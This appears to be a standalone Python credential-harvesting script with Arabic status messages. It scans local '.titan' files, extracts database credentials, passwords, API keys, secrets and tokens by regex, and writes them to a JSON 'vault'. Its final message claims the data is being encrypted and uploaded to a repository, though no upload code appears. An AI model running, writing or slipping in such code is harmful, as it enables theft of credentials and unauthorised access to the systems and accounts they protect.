import os, re, json
def harvest():
    print("\033[93m[*] بدء تغذية النواة واستخلاص الأسرار...\033[0m")
    vault = {}
    files = [f for f in os.listdir('.') if f.endswith('.titan')]
    for f_name in files:
        with open(f_name, 'r', errors='ignore') as f:
            content = f.read()
            matches = re.findall(r'(?i)(DB_HOST|DB_USER|DB_PASSWORD|API_KEY|SECRET|TOKEN|PASS)[\'"]?[:=>,]\s*[\'"]?([^\'"\n,;]+)', content)
            if matches:
                vault[f_name] = {k.upper(): v.strip() for k, v in matches}
                print(f"\033[92m[+] امتصاص بيانات: {f_name}\033[0m")
    with open('nucleus_memory.json', 'w') as out:
        json.dump(vault, out, indent=4)
    print("\033[94m[!] اكتملت التغذية. جاري التشفير والرفع للمستودع...\033[0m")
harvest()
